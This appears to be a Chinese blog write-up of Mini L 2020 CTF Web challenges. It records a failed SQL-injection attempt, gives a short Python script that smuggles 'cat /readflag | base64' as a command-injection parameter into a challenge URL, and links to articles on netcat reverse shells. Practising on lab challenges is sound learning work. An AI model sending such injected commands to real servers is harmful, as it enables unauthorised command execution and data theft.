---
title: 【Mini L 2020 题解】日常玩耍
categories: 
- 计算机科学
- 网络安全
- CTF
- MiniL
tags: 
- CTF
- Web
- Python
---

# Mini L 2020 题解

在MiniL2021之前玩耍一下

<!--more-->

## Web

### id_wife

![image-20210429221306970](http://framist-bucket-openread.oss-cn-shanghai.aliyuncs.com/img/2023/08/15/20230815210511.png)

随便敲字符：


```
error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use  near '''')' at line 1`
```
啊啊啊发现自己的SQL注入方面其实根本就没学过，在网上也没有搜到很好的教程。无效尝试许久之后忍不住翻了答案：

[Mini L CTF WriteUp By Int3rn3t_Expl0rer Team - Reverier's Blog (wootec.top)](https://www.wootec.top/2020/05/17/minil-ctf-wp/#Web)

### 签到题

```python
import requests
import base64
url = 'http://6c366814-f63f-4de8-954b-06ef78b851eb.archive.xdsec.chall.frankli.site/'

getdata = {'a' : 'cat /readflag | base64'}

req = requests.get(url= url , params=getdata)
# print(req.url)
# print(req.encoding)
out = req.text
out = out[:out.find('<code>')]
print(out)
with open('out','wb') as f:
    f.write(base64.b64decode(out))
```



[(2条消息) Windows/Linux 下nc 反弹shell_SoulCat-CSDN博客_nc反弹shell](https://blog.csdn.net/csacs/article/details/91440568)



[NC反弹shell的几种方法 - ctrl_TT豆 - 博客园 (cnblogs.com)](https://www.cnblogs.com/-chenxs/p/11748488.html)

[(2条消息) Linux反弹shell姿势总结_葵花与巷_的博客-CSDN博客](https://blog.csdn.net/qq_45924653/article/details/107445417)